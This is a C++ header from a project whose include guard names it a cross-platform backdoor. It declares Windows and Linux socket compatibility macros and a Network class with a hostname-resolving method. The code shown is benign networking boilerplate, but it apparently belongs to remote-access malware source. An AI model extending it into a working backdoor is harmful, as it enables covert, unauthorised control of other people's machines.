//
// Created by mfranc on 25/11/15.
//

#ifndef BACKDOORCPPCROSSPLATEFORM_NETWORK_H
#define BACKDOORCPPCROSSPLATEFORM_NETWORK_H

#ifdef __unix__
    #define OS_Linux
#elif defined(_WIN32) || defined(WIN32)
    #define OS_Windows
#endif

// Std librairies
#include <string>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <fcntl.h>
#include <stdexcept>

// Cross plateform compatibility
#if defined(OS_Windows)
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
#elif defined(OS_Linux)
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include<netdb.h> //hostent
    #include <unistd.h>

    // Rewrite function name with macro to be the same name as Windows API
    #define closesocket(s) close (s)
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    typedef int SOCKET;
    typedef struct sockaddr_in SOCKADDR_IN;
    typedef struct sockaddr SOCKADDR;
#endif

using namespace std;

class Network {
    public:
        static string resolvAddress(string hostname);
};


#endif //BACKDOORCPPCROSSPLATEFORM_NETWORK_H
